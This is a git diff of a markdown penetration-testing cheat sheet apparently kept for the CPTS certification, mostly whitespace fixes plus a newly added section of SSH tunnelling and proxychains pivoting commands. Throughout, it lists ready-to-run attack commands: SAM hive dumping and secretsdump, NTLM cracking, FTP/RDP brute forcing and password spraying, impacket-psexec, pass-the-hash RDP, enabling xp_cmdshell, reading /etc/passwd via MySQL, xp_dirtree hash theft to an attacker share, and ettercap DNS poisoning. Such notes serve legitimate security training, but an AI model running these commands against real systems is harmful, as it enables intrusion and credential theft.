@@ -1,4 +1,4 @@
-# CPTS 
+# CPTS
 
 % CPTS
 
@@ -14,7 +14,7 @@ nc -nv <ip> <port>
 sudo tcpdump -i <interface> port <port> -w <out.pcap>
 ```
 
-## nmap - scripts category 
+## nmap - scripts category
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 sudo nmap <target> --script <category>
@@ -56,7 +56,7 @@ sudo nmap <ip> -p <ports> -sA -Pn -n --disable-arp-ping --packet-trace
 sudo nmap <target> -p <ports> -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
 ```
 
-## nmap - w/ different source IP 
+## nmap - w/ different source IP
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 sudo nmap <target> -n -Pn -p <ports> -O -S <sourceIP> -e tun0
@@ -297,7 +297,7 @@ openssl s_client -connect <target>:imaps
 snmpwalk -v2c -c public <target>
 ```
 
-##  footprinting - SNMP - OneSixtyOne 
+##  footprinting - SNMP - OneSixtyOne
 #plateform/linux #target/remote #port/udp161 #protocol/snmp #cat/ATTACK/
 ```
 onesixtyone -c <pathSecListsSNMP.txt> <target>
@@ -394,7 +394,7 @@ ssh -v <user>@<target> -o PreferredAuthentications=password
 sudo nmap -sV -p 873 <target>
 ```
 
-##  footprinting - Rsync - probing for accesible shares 
+##  footprinting - Rsync - probing for accesible shares
 #plateform/linux #target/remote #port/873 #protocol/rsync #cat/ATTACK/
 ```
 nc -nv <target> 873
@@ -680,13 +680,13 @@ echo "reg.exe save hklm\security C:\security.save"
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <sharename> <directoryPathToShare>
 ```
 
-## password attacks - local - secretsdump dump hives 
+## password attacks - local - secretsdump dump hives
 #plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
 ```
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 
-## password attacks - local - crack hashes NTLM from sam 
+## password attacks - local - crack hashes NTLM from sam
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 sudo hashcat -m 1000 <hashesFile> <pathToWordlist>
@@ -827,7 +827,7 @@ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " 
 ## password attacks - local - linux credential hunting cronjobs
 #plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-cat /etc/crontab 
+cat /etc/crontab
 ```
 
 ## password attacks - local - linux credential hunting ssh private keys
@@ -956,7 +956,7 @@ N:
 Get-ChildItem -Recurse -Path N:\ -Include *<cred/term>* -File
 ```
 
-## attacking common services - smb powershell - 
+## attacking common services - smb powershell -
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
 Get-ChildItem -Recurse -Path N:\ | Select-String "<cred/term>" -List
@@ -966,7 +966,7 @@ Get-ChildItem -Recurse -Path N:\ | Select-String "<cred/term>" -List
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 sudo mkdir /mnt/<share>
-sudo mount -t cifs -o username=<username>,password=<password>,domain=. //<ip>/<share> /mnt/<share>  
+sudo mount -t cifs -o username=<username>,password=<password>,domain=. //<ip>/<share> /mnt/<share>
 ```
 
 ## attacking common services - smb linux - smb credential file
@@ -980,13 +980,13 @@ mount -t cifs //<ip>/<share> /mnt/<share> -o=<pathToCredentialFile>
 ```
 echo "username=<username>" > credsFile
 echo "password=<password>" >> credsFile
-echo "domain=." >> credsFile 
+echo "domain=." >> credsFile
 ```
 
 ## attacking common services - smb linux - find cred file
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-find /mnt/<share>/ -name *cred* 
+find /mnt/<share>/ -name *cred*
 ```
 
 ## attacking common services - smb linux - files that combine string creds
@@ -1016,7 +1016,7 @@ mysql -u <username> -p<password> -h <ip>
 ## attacking common services - ftp - nmap ftp script scan
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-sudo nmap -sC -sV -p 21 <ip> 
+sudo nmap -sC -sV -p 21 <ip>
 ```
 
 ## attacking common services - ftp - test anonymous login
@@ -1028,7 +1028,7 @@ ftp <ip>
 ## attacking common services - ftp medusa brute forcing
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-medusa -u <user> -P <PathTopassFile> -h <ip> -M ftp 
+medusa -u <user> -P <PathTopassFile> -h <ip> -M ftp
 ```
 
 ## attacking common services - ftp bounce attack
@@ -1037,7 +1037,7 @@ medusa -u <user> -P <PathTopassFile> -h <ip> -M ftp
 nmap -Pn -v -n -p<-/orSpecifyPorts> -b <username>:<password>@<FTPserverIP> <SecondTargetIP>
 ```
 
-## attacking common services - ftp brute force 
+## attacking common services - ftp brute force
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 hydra -<Ll> <user> -<Pp> <pass> ftp://<ip>:<port>
@@ -1098,7 +1098,7 @@ enum4linux <ip> -A -C
 nxc smb <targetIP> -u <userlist> -p '<password2spray>' --local-auth
 ```
 
-## attacking common services - smb - impacket psexec 
+## attacking common services - smb - impacket psexec
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 impacket-psexec <username>:'<password>'@<targetIP>
@@ -1185,7 +1185,7 @@ sqsh -S <IP> -U <username> -P '<password>' -h
 ## attacking common services - sql - mssql client
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-mssqlclient.py -p 1433 <username>@<IP> 
+mssqlclient.py -p 1433 <username>@<IP>
 ```
 
 ## attacking common services - sql - mssql sqsh
@@ -1194,46 +1194,46 @@ mssqlclient.py -p 1433 <username>@<IP>
 sqsh -S <IP> -U <. or server name>\\<username> -P '<password>' -h
 ```
 
-## attacking common services - mysql - list databases 
+## attacking common services - mysql - list databases
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 show databases;
 ```
 
-## attacking common services - mssql - list databases 
+## attacking common services - mssql - list databases
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 select name from master.dbo.sysdatabases
 go
 ```
 
-## attacking common services - mysql - select database 
+## attacking common services - mysql - select database
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 use <database>;
 ```
 
-## attacking common services - mssql - select database 
+## attacking common services - mssql - select database
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 use <database>
 go
 ```
 
-## attacking common services - mysql - show tables 
+## attacking common services - mysql - show tables
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 show tables;
 ```
 
-## attacking common services - mssql - show tables 
+## attacking common services - mssql - show tables
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 select table_name FROM <database>.information_schema.tables
 go
 ```
 
-## attacking common services - mysql - select all data from table 
+## attacking common services - mysql - select all data from table
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 select * from users;
@@ -1256,19 +1256,19 @@ go
 ## attacking common services - mssql - enable MSSQL command execution (with privileges)
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-To allow advanced options to be changed.  
+To allow advanced options to be changed.
 EXECUTE sp_configure 'show advanced options', 1
 go
 
-To update the currently configured value for advanced options.  
+To update the currently configured value for advanced options.
 RECONFIGURE
-go  
+go
 
-To enable the feature.  
+To enable the feature.
 EXECUTE sp_configure 'xp_cmdshell', 1
-go  
+go
 
-To update the currently configured value for this feature.  
+To update the currently configured value for this feature.
 RECONFIGURE
 go
 ```
@@ -1324,14 +1324,14 @@ go
 select LOAD_FILE("/etc/passwd");
 ```
 
-## attacking common services - mssql - capture service hash/XP_DIRTREE Hash Stealing (turn on responder/impacket-smbserver before) 
+## attacking common services - mssql - capture service hash/XP_DIRTREE Hash Stealing (turn on responder/impacket-smbserver before)
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 EXEC master..xp_dirtree '\\<ourIP>\share\'
 go
 ```
 
-## attacking common services - mssql - capture service hash/XP_SUBDIRS Hash Stealing (turn on responder/impacket-smbserver before) 
+## attacking common services - mssql - capture service hash/XP_SUBDIRS Hash Stealing (turn on responder/impacket-smbserver before)
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 EXEC master..xp_subdirs '\\<ourIP>\share\'
@@ -1365,7 +1365,7 @@ go
 ```
 
 
-## attacking common services - mssql - communicate with other databases 
+## attacking common services - mssql - communicate with other databases
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 Step 1 identify linked servers. 1 = remote server:
@@ -1382,7 +1382,7 @@ go
 ## attacking common services - rdp - nmap rdp detection
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-nmap -Pn -p3389 <ip> 
+nmap -Pn -p3389 <ip>
 ```
 
 ## attacking common services - rdp - rdp password spraying crowbar
@@ -1450,7 +1450,7 @@ xfreerdp /v:<targetIP> /u:<user> /pth:<hash_300FF5E89EF33F83A8146C10F5AB9BB9>
 ## from job - discover more subnets - nmap
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-sudo nmap -sn <IP.0.0>/16  
+sudo nmap -sn <IP.0.0>/16
 ```
 
 ## attacking common services - dns - nmap scan
@@ -1490,7 +1490,7 @@ subbrute <domain> -s ./names.txt -r ./resolvers.txt
 host <sub.domain.com>
 ```
 
-## attacking common services - dns - local - DNS cache poisoning Step 1 
+## attacking common services - dns - local - DNS cache poisoning Step 1
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 sudo bash -c 'echo -e "<*.domain.com>  A  <ip>" >> /etc/ettercap/etter.dns'
@@ -1507,7 +1507,7 @@ sudo bash -c 'echo -e "<*.domain.com>  A  <ip>" >> /etc/ettercap/etter.dns'
 6. In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well
 ```
 
-## attacking common services - smtp - host MX records 
+## attacking common services - smtp - host MX records
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 host -t MX <domain>
@@ -1589,4 +1589,83 @@ nmap -p25 -Pn --script smtp-open-relay <targetIP>
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 swaks --from <email> --to <destEmail> --header 'Subject: <subject>' --body '<body>' --server <mailServer>
+```
+
+## pivtunnportf - displays all current network configurations Linux
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ifconfig
+```
+
+## pivtunnportf - displays all current network configurations Windows
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ipconfig
+```
+
+## pivtunnportf - display the routing table for all IPv4-based protocols.
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+netstat -r
+```
+
+## pivtunnportf - scan a target for open ports
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -sT -p- <IPaddressofTarget>
+```
+
+## pivtunnportf - SSH tunnel from local machine on local port 1234 to a remote target port.
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ssh -L 1234:localhost:<targetPort> <username>@<IPaddressofTarget>
+```
+
+## pivtunnportf - display network connections associated with a tunnel created.
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+netstat -antp | grep 1234
+```
+
+## pivtunnportf - Scan a host through a connection that has been made on local port 1234.
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -v -sV -p1234 localhost
+```
+
+## pivtunnportf - Multiple port forward
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ssh -L 1234:localhost:<targetPort> <localPort>:localhost:<targetPort2> <username>@<IPaddressofTarget>
+```
+
+## pivtunnportf - Perform a dynamic port forward on port 9050 - SSH tunnel with the target - Part of setting up a SOCKS proxy.
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ssh -D <localPort> <username>@<IPaddressofTarget>
+```
+
+## pivtunnportf - Used to ensure socks configurations are in place.
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+# add, verify or modify line: socks4 127.0.0.1 9050
+tail -4 /etc/proxychains.conf
+```
+
+## pivtunnportf - Using Nmap with Proxychains
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+proxychains nmap -sT -Pn <IPoIPrange>
+```
+
+## pivtunnportf - Using Metasploit with Proxychais
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+proxychains msfconsole
+```
+
+## pivtunnportf - Connecting to RDP through Proxychains
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+proxychains xfreerdp /v:<targetIP> /u:<username> /p:<passwd>
 ```
